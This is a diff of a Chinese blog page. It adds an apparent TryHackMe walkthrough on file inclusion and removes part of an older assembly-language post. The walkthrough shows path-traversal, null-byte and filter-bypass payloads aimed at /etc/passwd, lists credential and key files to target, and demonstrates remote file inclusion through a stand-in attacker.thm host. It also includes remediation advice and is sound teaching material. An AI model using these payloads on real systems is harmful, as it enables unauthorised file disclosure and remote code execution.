@@ -164,6 +164,419 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/01/01/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/hxt.jpg">
+      <meta itemprop="name" content="hxt">
+      <meta itemprop="description" content="May the Force be with you.">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="hxt's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/01/01/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" class="post-title-link" itemprop="url">File inclusion(文件包含)</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2023-01-01 17:56:14" itemprop="dateCreated datePublished" datetime="2023-01-01T17:56:14+08:00">2023-01-01</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-06-10 15:49:08" itemprop="dateModified" datetime="2023-06-10T15:49:08+08:00">2023-06-10</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/TryHackMe/" itemprop="url" rel="index"><span itemprop="name">TryHackMe</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>8k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>7 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>TryHackMe实验房间：https://tryhackme.com/room/fileinc</p>
+<p>本文参考：https://www.cnblogs.com/Hekeats-L/p/16904866.html</p>
+<h2 id="introduction">Introduction</h2>
+<h3 id="what-is-file-inclusion">What is File inclusion</h3>
+<p>文件包含漏洞包括本地文件包含(Local File
+Inclusion，LFI)，远程文件包含(Remote File
+Inclusion，RFI)和目录遍历(directory traversal)。</p>
+<p>在某些场景中，编写web应用程序是为了用户能够通过参数请求访问给定系统的文件，包括图像、静态文本等。参数是附加到
+URL 上的查询参数字符串，可用于用户输入检索数据或执行操作。下图展示了 URL
+的基本组成部分。（注：<code>?</code>不属于 query string 的一部分）</p>
+<figure>
+<img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20230101142447372.png" alt="image-20230101142447372">
+<figcaption aria-hidden="true">image-20230101142447372</figcaption>
+</figure>
+<p>下面讨论一个例子，用户请求访问web服务器的文件。首先用户将HTTP请求发送到对应的web服务器以显示请求中包含的文件，假设用户想要访问并在页面显示文件内容，请求可能如下：<code>http://webapp.thm/get.php?file=userCV.pdf</code>，其中<code>file</code>是参数，<code>userCV.pdf</code>是用户请求访问的文件名。</p>
+<figure>
+<img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20230101150112981.png" alt="image-20230101150112981">
+<figcaption aria-hidden="true">image-20230101150112981</figcaption>
+</figure>
+<h3 id="why-do-file-inclusion-vulnerabilities-happen">Why do File
+inclusion vulnerabilities happen？</h3>
+<p>文件包含漏洞通常在web应用程序的各种编程语言中被发现和利用，例如编写以及实现得较差的
+<strong>PHP</strong> 程序。这些漏洞的主要问题在于输入验证(input
+validation)，用户的输入未经排查或验证从而使得用户控制它们。</p>
+<h3 id="what-is-the-risk-of-file-inclusion">What is the risk of File
+inclusion？</h3>
+<p>文件包含的风险取决于攻击者是否可以利用文件包含漏洞读取敏感数据。成功的攻击会导致敏感数据的泄露，包括web应用程序的代码和文件，以及后端系统的凭证。此外，如果攻击者能够以某种方式对服务器的文件进行写入，例如<code>/tmp</code>目录，那么就有可能导致远程命令执行（RCE）漏洞。然而，当文件包含漏洞无法获取敏感数据并且无法对服务器进行写入时，该漏洞就不会有效。</p>
+<h2 id="path-traversal路径遍历">Path Traversal（路径遍历）</h2>
+<p>也称为 <strong>Directory
+traversal</strong>（目录遍历），该漏洞允许攻击者读取操作系统资源，例如运行应用程序的服务器上的本地文件。攻击者通过操纵和滥用web应用程序的URL来定位和访问存储在应用程序之外的文件或目录，从而实现对该漏洞的利用。</p>
+<p>当用户的输入传递给PHP中的<code>file_get_contents</code>等函数时，会出现路径遍历漏洞。需要注意的是，函数并不是导致漏洞的主要因素。通常，输入验证或过滤不佳才是导致该漏洞的原因。在PHP中，您可以使用<code>file_get_contents</code>读取文件的内容。在<a target="_blank" rel="noopener" href="https://www.php.net/manual/en/function.file-get-contents.php">这里</a>可以查看有关该函数的更多信息。</p>
+<p>下面的图片展示了web应用程序如何存储文件及其文件结构。用户可通过路径<code>/var/www/app/CVs</code>请求访问<code>userCV.pdf</code>文件的内容。</p>
+<figure>
+<img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20230101155922722.png" alt="image-20230101155922722">
+<figcaption aria-hidden="true">image-20230101155922722</figcaption>
+</figure>
+<p>我们可以通过添加 <strong>payload</strong>
+来查看web应用程序的行为用以测试URL参数。路径遍历攻击也称为<code>dot-dot-slash</code>攻击(<strong>../</strong>)，该攻击利用<code>../</code>将目录移动到<strong>上一级</strong>。如果攻击者找到了攻击点，在上图中是<code>get.php?file=</code>，<code>get.php</code>的路径为<code>/var/www/app/get.php</code>，然后攻击者可能发送如下内容：<code>http://webapp.thm/get.php?file=../../../../etc/passwd</code>，通过<code>../</code>不断返回上一级直到根目录，再进入根目录下的<code>/etc</code>目录，找到<code>passwd</code>文件。因此web应用程序最终返回<code>passwd</code>的文件内容。</p>
+<p>同样，如果web应用程序在Windows服务器上运行，攻击者需要提供Windows路径。例如，如果攻击者想要读取<code>c:\boot.ini</code>中的<code>boot.ini</code>文件，那么攻击者可以根据目标Windows系统版本尝试以下操作：</p>
+<blockquote>
+<p>http://webapp.thm/get.php?file=../../../../boot.ini</p>
+<p>或</p>
+<p>http://webapp.thm/get.php?file=../../../../windows/win.ini</p>
+</blockquote>
+<p>下面是测试时的一些常见的操作系统文件：</p>
+<table>
+<colgroup>
+<col style="width: 31%">
+<col style="width: 68%">
+</colgroup>
+<thead>
+<tr class="header">
+<th style="text-align: center;"><strong>Location</strong></th>
+<th style="text-align: center;"><strong>Description</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td style="text-align: center;">/etc/issue</td>
+<td style="text-align: center;">contains a message or system
+identification to be printed before the login prompt.</td>
+</tr>
+<tr class="even">
+<td style="text-align: center;">/etc/profile</td>
+<td style="text-align: center;">controls system-wide default variables,
+such as Export variables, File creation mask (umask), Terminal types,
+Mail messages to indicate when new mail has arrived</td>
+</tr>
+<tr class="odd">
+<td style="text-align: center;">/proc/version</td>
+<td style="text-align: center;">specifies the version of the Linux
+kernel</td>
+</tr>
+<tr class="even">
+<td style="text-align: center;">/etc/passwd</td>
+<td style="text-align: center;">has all registered user that has access
+to a system</td>
+</tr>
+<tr class="odd">
+<td style="text-align: center;">/etc/shadow</td>
+<td style="text-align: center;">contains information about the system's
+users' passwords</td>
+</tr>
+<tr class="even">
+<td style="text-align: center;">/root/.bash_history</td>
+<td style="text-align: center;">contains the history commands for root
+user</td>
+</tr>
+<tr class="odd">
+<td style="text-align: center;">/var/log/dmessage</td>
+<td style="text-align: center;">contains global system messages,
+including the messages that are logged during system startup</td>
+</tr>
+<tr class="even">
+<td style="text-align: center;">/var/mail/root</td>
+<td style="text-align: center;">all emails for root user</td>
+</tr>
+<tr class="odd">
+<td style="text-align: center;">/root/.ssh/id_rsa</td>
+<td style="text-align: center;">Private SSH keys for a root or any known
+valid user on the server</td>
+</tr>
+<tr class="even">
+<td style="text-align: center;">/var/log/apache2/access.log</td>
+<td style="text-align: center;">the accessed requests for Apache
+webserver</td>
+</tr>
+<tr class="odd">
+<td style="text-align: center;">C:.ini</td>
+<td style="text-align: center;">contains the boot options for computers
+with BIOS firmware</td>
+</tr>
+</tbody>
+</table>
+<h2 id="local-file-inclusionlfi">Local File Inclusion（LFI）</h2>
+<p>针对 Web 应用程序的 LFI 攻击通常是由于开发人员缺乏安全意识。在使用
+PHP 时，使用 <code>include</code>、 <code>request</code>、
+<code>include _ once</code> 和 <code>request _ once</code>
+等函数常常会导致 Web
+应用程序易受攻击。在使用其他语言（如ASP、JSP，甚至Node.js）时也会出现LFI漏洞。LFI漏洞利用遵循与路径遍历相同的概念。</p>
+<p>接下来将介绍不同的LFI场景。</p>
+<ol type="1">
+<li><p>假设web应用程序提供两种语言，用户可以在<code>EN</code>和<code>AR</code>之间进行选择。</p>
+<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>PHP</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">"lang"</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure>
+<p>上面的PHP代码通过URL参数 <code>lang</code> 使用 <code>GET</code>
+请求来包含页面的文件。可以发送以下HTTP请求来完成调用：<code>http://webapp.thm/index.php?lang=EN.php</code>加载英文页面或<code>http://webapp.thm/index.php?lang=AR.php</code>加载阿拉伯语页面，其中
+<code>EN.php</code> 和 <code>AR.php</code> 文件位于同一目录中。</p>
+<p>理论上，如果没有任何输入验证，我们可以通过上面的代码访问并显示服务器上的任何可读文件。假设我们想读取
+<code>/etc/passwd</code>
+文件，其中包含Linux操作系统用户的敏感信息，我们可以尝试以下操作：<code>http://webapp.thm/get.php?file=/etc/passwd</code></p>
+<p>在这种情况下，它之所以有效，是因为 <code>include</code>
+函数中没有指定目录，也没有输入验证。</p></li>
+<li><p>第二种情况，开发人员指定了函数中的目录。</p>
+<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>PHP </span><br><span class="line">	<span class="keyword">include</span>(<span class="string">"languages/"</span>. <span class="variable">$_GET</span>[<span class="string">'lang'</span>]); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure>
+<p>在上面的代码中，开发人员决定使用<code>include</code>函数通过
+<code>lang</code> 参数调用 <code>language</code>
+目录中的PHP页面。如果没有输入验证，攻击者可以通过将 <code>lang</code>
+输入替换为其他OS敏感文件（如<code>/etc/passwd</code>）来操纵URL。此时，payload
+看起来类似于<strong>路径遍历</strong>，但 <code>include</code>
+函数允许我们将任何调用的文件包含到当前页面中。以下是漏洞利用：</p>
+<p><code>http://webapp.thm/index.php?lang=../../../../etc/passwd</code></p></li>
+</ol>
+<p>下面介绍的是一些绕过<code>include</code>函数过滤的技巧。</p>
+<ol type="1">
+<li><p>对于上面两种情况，我们检查了web应用程序的代码，所以我们知道如何利用它。而在本例中，我们将进行黑盒测试（无法得知源代码），在这种情况下，<strong>报错信息</strong>对于理解数据是如何在web应用程序中的传递和处理十分重要。</p>
+<p>在这种情况下，假设我们有该切入点：<code>http://webapp.thm/index.php?lang=EN</code>。如果我们输入无效的字段，例如<code>THM</code>，我们将得到如下错误：</p>
+<blockquote>
+<p>Warning: include(languages/THM.php): failed to open stream: No such
+file or directory in /var/www/html/THM-4/index.php on line 12</p>
+</blockquote>
+<p>该报错信息披露了重要信息，通过将<code>THM</code>作为输入，错误信息显示了<code>include</code>函数的相关内容：<code>include(languages/THM.php);</code>。</p>
+<p>仔细查看该目录，我们可以知道该函数包含了<code>languages</code>目录中的文件，并在输入的字符串结尾加上了<code>.php</code>。因此有效输入如下：<code>index.php?lang=EN</code>，其中文件<code>EN</code>在<code>languages</code>目录中，完整文件名为<code>EN.php</code>。此外，报错信息还披露了完整web应用程序目录路径的信息：<code>/var/www/html/THM-4/</code>（即<code>languages</code>目录所在路径）。</p>
+<p>我们可以利用<code>http://webapp.thm/index.php?lang=../../../../../etc/passwd</code>来查看敏感信息，我们需要使用
+5个 <code>../</code> ，因为我们通过报错信息 已经知道当前路径有四级目录
+<code>/var/www/html/THM-4</code>然后再加上之前提到的<code>languages</code>目录，所以一共有需要5个<code>../</code>但是仍然得到错误信息：</p>
+<blockquote>
+<p>Warning: include(languages/../../../../../etc/passwd.php): failed to
+open stream: No such file or directory in /var/www/html/THM-4/index.php
+on line 12</p>
+</blockquote>
+<p>由上面的错误信息可知我们可以访问不同目录中的文件，但是<code>include</code>函数会在文件结尾加上<code>.php</code>，导致无法找到对应的文件。这告诉我们：开发人员指定了传递给<code>include</code>函数的文件类型（php）。为了绕过这种限制，我们可以使用<strong>NULL
+BYTE</strong>（即<code>%00</code>）。</p>
+<p>使用空字节是一种注入(injection)技术，通过在用户提供的数据添加 URL
+编码<code>%00</code>或十六进制的<code>0x00</code>，以终止字符串。你可以将其视为试图欺骗Web应用程序无视空字节后发生的任何事情。</p>
+<p>通过在 payload
+的结尾添加空字节，告诉<code>include</code>函数忽略空字节之后的内容，如下：</p>
+<p><code>include("languages/../../../../../etc/passwd%00").".php");</code>
+相当于 <code>include("languages/../../../../../etc/passwd");</code></p>
+<p><strong>注意</strong>：<code>%00</code>技巧已修复，不适用于 PHP 5.3.4
+及更高版本。</p></li>
+<li><p>假设开发者决定过滤关键字以避免泄露敏感信息！正在被过滤的是<code>/etc/passwd</code>文件。此时，有两种可能的方法可以尝试绕过该过滤器：通过使用空字节
+<code>%00</code>
+或关键字<code>/.</code>。payload可以是<code>http://webapp.thm/index.php?lang=/etc/passwd/.</code>或<code>http://webapp.thm/index.php?lang=/etc/passwd%00</code>。</p>
+<p>为了更清楚地理解
+<code>/.</code>的使用原理，我们可以查看以下例子：如果我们在文件系统中使用<code>cd ..</code>，我们将切换到上一级目录；如果我们使用的是<code>cd .</code>，我们将停留在当前目录。</p>
+<p>因此，当我们输入<code>/etc/passwd/..</code>时，我们将切换目录到<code>/etc/</code>，然后当我们输入<code>/etc/passwd/.</code>时，将停留在当前目录<code>/etc/passwd</code>，因为<code>.</code>指代的就是当前工作目录。</p></li>
+<li><p>假设开发人员通过过滤一些关键字来验证用户输入。假设我们输入的
+payload
+是：<code>http://webapp.thm/index.php?lang=../../../../etc/passwd</code></p>
+<p>得到的错误信息如下：</p>
+<blockquote>
+<p>Warning: include(languages/etc/passwd): failed to open stream: No
+such file or directory in /var/www/html/THM-5/index.php on line 15</p>
+</blockquote>
+<p>由错误信息中的<code>include(languages/etc/passwd)</code>可知web应用程序将<code>../</code>过滤掉了，通过以下方式可以绕过验证：<code>....//....//....//....//....//etc/passwd</code>。</p>
+<p>绕过原理：PHP过滤器只匹配并消除它找到的第一个子集字符串<code>../</code>，然后不再过滤，如下图所示：</p>
+<figure>
+<img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20230102094746337.png" alt="image-20230102094746337">
+<figcaption aria-hidden="true">image-20230102094746337</figcaption>
+</figure></li>
+<li><p>假设开发人员强制<code>include</code>函数从指定的目录读取文件。例如，web应用程序要求用户的输入必须包含指定的目录：<code>http://webapp.thm/index.php?lang=languages/EN.php</code>，因此
+payload
+应该包含指定目录：<code>?lang=languages/../../../../../etc/passwd</code>。</p></li>
+</ol>
+<h2 id="remote-file-inclusionrfi">Remote File Inclusion（RFI）</h2>
+<p>远程文件包含 (RFI)
+是一种将远程文件包含到易受攻击的web应用程序中的技术。类似于LFI，当发生不正确的验证时，就会导致RFI，攻击者能够将外部的
+URL 注入 <code>include</code> 函数中。<strong>RFI
+发生的条件是需要目标服务器启用<code>allow_url_fopen</code>选项，即将该选项设置为<code>on</code>。</strong></p>
+<p>RFI 的风险高于 LFI，因为 RFI
+漏洞允许攻击者在目标服务器上进行<strong>远程命令执行（RCE）</strong>操作。RFI
+导致的其他后果：</p>
+<ul>
+<li>敏感数据泄露</li>
+<li>Cross-site Scripting（XSS）</li>
+<li>Denial of Service（DoS）</li>
+</ul>
+<p>外部服务器必须与目标web应用程序服务器进行通信，以成功实现RFI攻击，攻击者在他们自己的服务器(外部服务器)上托管恶意文件。然后，恶意文件通过HTTP请求注入到目标服务器的<code>include</code>函数中，使得恶意文件的内容在目标应用程序服务器上执行。</p>
+<figure>
+<img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20230102101719466.png" alt="image-20230102101719466">
+<figcaption aria-hidden="true">image-20230102101719466</figcaption>
+</figure>
+<p>如上图所示，攻击者在自己的服务器上托管了一个 PHP
+文件：<code>http://attacker.thm/cmd.txt</code>。其中<code>cmd.txt</code>的内容如下：</p>
+<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>PHP <span class="keyword">echo</span> <span class="string">"Hello THM"</span>; <span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure>
+<p>首先，攻击者注入了恶意的URL（指向攻击者服务器）：<code>http://webapp.thm/index.php?lang=http://attacker.thm/cmd.txt</code>。如果没有输入验证，那么恶意
+URL
+会被传递给<code>include</code>函数。接下来，web应用程序服务器会向攻击者服务器发送<code>GET</code>请求以获取目标文件。于是目标Web
+应用程序会将远程文件包含到 <code>include</code> 函数中，在页面执行 PHP
+文件，并将执行结果返回给攻击者。在该例子中，攻击者会在页面看见<code>Hello THM</code>消息。</p>
+<h3 id="实例">实例</h3>
+<p>首先介绍如何快速搭建一个http服务，使用 simpleHTTPserver
+在几分钟内将您的桌面系统变成本地文件服务器。simpleHTTPserver 是一个
+python 模块，可用于设置文件服务器或在 LAN
+中即时提供目录。局域网中的任何人都可以立即访问您系统中的文件夹或文件。对于python
+3.0及以上版本，运行：</p>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python -m http.server [port]</span><br></pre></td></tr></tbody></table></figure>
+<p>下面开始进行实验：</p>
+<p>首先在攻击者服务器上新建一个 <code>cmd.txt</code>
+文件，内容为：<code>&lt;?PHP echo "Hello THM"; ?&gt;</code>。然后就在当前目录下输入<code>python -m http.server</code>(端口默认为
+8000)。</p>
+<figure>
+<img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20230102104507593.png" alt="image-20230102104507593">
+<figcaption aria-hidden="true">image-20230102104507593</figcaption>
+</figure>
+<p>然后在目标网站上输入 payload，实现 RFI 攻击。</p>
+<figure>
+<img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20230102104721781.png" alt="image-20230102104721781">
+<figcaption aria-hidden="true">image-20230102104721781</figcaption>
+</figure>
+<p>同时攻击者服务器会记录目标服务器的请求：</p>
+<figure>
+<img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20230102104911230.png" alt="image-20230102104911230">
+<figcaption aria-hidden="true">image-20230102104911230</figcaption>
+</figure>
+<h2 id="remediation补救措施">Remediation(补救措施)</h2>
+<p>作为开发人员，了解 Web
+应用程序漏洞、掌握漏洞的发现方法以及预防方法非常重要。
+为了防止文件包含漏洞被攻击者利用，一些常见的建议如下：</p>
+<ul>
+<li>将系统和服务（包括 Web 应用程序框架）更新为最新版本。</li>
+<li>关闭 PHP 报错以避免泄露应用程序的路径和其他可能泄露的信息。</li>
+<li>Web 应用程序防火墙 (WAF) 是帮助减轻 Web
+应用程序攻击的不错选择。</li>
+<li>禁用一些会导致文件包含漏洞的 PHP 功能，例如
+<code>allow_url_fopen</code> （<code>on</code> 选项）和
+<code>allow_url_include</code>。</li>
+<li>仔细分析 Web 应用程序，只允许需要的协议和 PHP 包装器。</li>
+<li>永远不要相信用户的输入，并确保针对文件包含实施适当的输入验证处理。</li>
+<li>对文件名和文件位置实施白名单以及黑名单策略。</li>
+</ul>
+<h2 id="challenge">Challenge</h2>
+<h3 id="flag1">flag1</h3>
+<p>打开对应的lab，发现本题需要使用<code>POST</code>传参：</p>
+<figure>
+<img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20230102140838373.png" alt="image-20230102140838373">
+<figcaption aria-hidden="true">image-20230102140838373</figcaption>
+</figure>
+<p>打开 hackbar ，使用post传参得到flag：</p>
+<figure>
+<img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20230102141011199.png" alt="image-20230102141011199">
+<figcaption aria-hidden="true">image-20230102141011199</figcaption>
+</figure>
+<h3 id="flag2">flag2</h3>
+<p>打开chall2，显示以下页面：</p>
+<figure>
+<img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20230102141342252.png" alt="image-20230102141342252">
+<figcaption aria-hidden="true">image-20230102141342252</figcaption>
+</figure>
+<p>根据提示，这题跟<code>cookie</code>有关，F12
+打开开发者工具，在<code>存储</code>中找到 cookie</p>
+<figure>
+<img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20230102141551880.png" alt="image-20230102141551880">
+<figcaption aria-hidden="true">image-20230102141551880</figcaption>
+</figure>
+<p>将值改为<code>admin</code>，刷新页面，发现绿色框中会显示对应的文件内容：</p>
+<figure>
+<img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20230102141739830.png" alt="image-20230102141739830">
+<figcaption aria-hidden="true">image-20230102141739830</figcaption>
+</figure>
+<p>于是直接将 cookie 的值改为<code>/etc/flag2</code>，得到下图：</p>
+<figure>
+<img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20230102141854365.png" alt="image-20230102141854365">
+<figcaption aria-hidden="true">image-20230102141854365</figcaption>
+</figure>
+<p>由上图可知，当前所在路径为<code>includes</code>，并且在文件结尾加上了<code>.php</code>后缀，使用<code>../</code>移动到对应目录，然后用<code>%00</code>截断，所有最终构建的
+payload
+为：<code>../../../../etc/flag2%00</code>，刷新页面得到flag。</p>
+<figure>
+<img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20230102142239136.png" alt="image-20230102142239136">
+<figcaption aria-hidden="true">image-20230102142239136</figcaption>
+</figure>
+<h3 id="flag3">flag3</h3>
+<p>直接在给定的框中输入<code>/etc/flag3</code>，得到错误信息：</p>
+<figure>
+<img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20230102142448439.png" alt="image-20230102142448439">
+<figcaption aria-hidden="true">image-20230102142448439</figcaption>
+</figure>
+<p>由上图发现输入被过滤掉了一些关键字，并且在输入的结尾加上了<code>.php</code>后缀。于是尝试使用<code>POST</code>传参，得到下图：</p>
+<figure>
+<img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20230102142759419.png" alt="image-20230102142759419">
+<figcaption aria-hidden="true">image-20230102142759419</figcaption>
+</figure>
+<p>可知，<code>%00</code>被识别为了字符串，无法进行截断。使用 Burp Suite
+进行抓包，得到数据，然后发送到 Repeater 模块</p>
+<figure>
+<img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20230102143055329.png" alt="image-20230102143055329">
+<figcaption aria-hidden="true">image-20230102143055329</figcaption>
+</figure>
+<p>直接对数据部分进行修改，将<code>file=%2Fetc%2Fflag3%2500</code>修改为<code>file=%2Fetc%2Fflag3%00</code>，即将
+URL 编码后的 <code>%2500</code> 修改为原本的 <code>%00</code>
+，然后发送数据，得到flag</p>
+<figure>
+<img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20230102143238925.png" alt="image-20230102143238925">
+<figcaption aria-hidden="true">image-20230102143238925</figcaption>
+</figure>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://example.com/2022/12/31/IDOR/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1288,187 +1701,6 @@ text view 状态</p>
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/09/21/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%EF%BC%88%E4%B8%83%EF%BC%89/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/hxt.jpg">
-      <meta itemprop="name" content="hxt">
-      <meta itemprop="description" content="May the Force be with you.">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="hxt's Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/09/21/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%EF%BC%88%E4%B8%83%EF%BC%89/" class="post-title-link" itemprop="url">汇编语言（七）</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2022-09-21 13:32:09" itemprop="dateCreated datePublished" datetime="2022-09-21T13:32:09+08:00">2022-09-21</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2023-04-13 14:08:05" itemprop="dateModified" datetime="2023-04-13T14:08:05+08:00">2023-04-13</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E6%B1%87%E7%BC%96/" itemprop="url" rel="index"><span itemprop="name">汇编</span></a>
-                </span>
-            </span>
-
-          <br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>2.3k</span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-                <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>2 分钟</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="汇编语言七数据处理">汇编语言（七）——数据处理</h1>
-<p>reg（寄存器）：ax、bx、cx、dx、ah、al、bh、bl、ch、cl、dh、dl、sp、bp、si、di；</p>
-<p>sreg（段寄存器）：ds、ss、cs、es。</p>
-<h2 id="bxsidi-和-bp">bx、si、di 和 bp</h2>
-<p>在8086CPU中，只有标题中这四个寄存器可以用在 <code>[...]</code>
-中来进行内存单元的寻址。</p>
-<ul>
-<li><p>下面的指令是错误的：</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov ax, [cx]</span><br><span class="line">mov ax, [ax]</span><br><span class="line">mov ax, [dx]</span><br><span class="line">mov ax, [ds]</span><br></pre></td></tr></tbody></table></figure></li>
-<li><p>这四个寄存器可以单个出现，也可以这四种组合出现：bx 和 si 、bx 和
-di 、bp 和 si 、bp 和 di 。</p>
-<p>注：<strong>[bx + bp]</strong> 、<strong>[si + di]</strong>
-，这两个组合是错误的。</p></li>
-<li><p>只要在 <code>[...]</code> 中使用了寄存器 <strong>bp</strong>
-，而指令中没有显性地给出段地址，段地址就默认在 <code>ss</code> 中。</p>
-<p>例：</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov ax, [bp]                      含义：(ax) = ((ss)*16+(bp))</span><br><span class="line">mov ax, [bp+idata]                含义：(ax) = ((ss)*16+(bp)+idata)</span><br><span class="line">mov ax, [bp+si]                   含义：(ax) = ((ss)*16+(bp)+(si))</span><br><span class="line">mov ax, [bp+si+idata]             含义：(ax) = ((ss)*16+(bp)+(si)+idata)</span><br></pre></td></tr></tbody></table></figure></li>
-</ul>
-<h2 id="数据所在位置">数据所在位置</h2>
-<p>指令在执行前，所要处理的数据可以在三个位置：<strong>CPU内部</strong>、<strong>内存</strong>、<strong>端口</strong>。</p>
-<h2 id="数据位置的表达">数据位置的表达</h2>
-<ol type="1">
-<li><p>立即数（idata）</p>
-<p>对于直接包含在机器指令中的数据（执行前在CPU指令缓存器中），被称为立即数。</p>
-<p>例：</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov ax,1</span><br><span class="line">add bx,2000h</span><br><span class="line">or bx,00010000b</span><br><span class="line">mov al,'a'</span><br></pre></td></tr></tbody></table></figure></li>
-<li><p>寄存器</p>
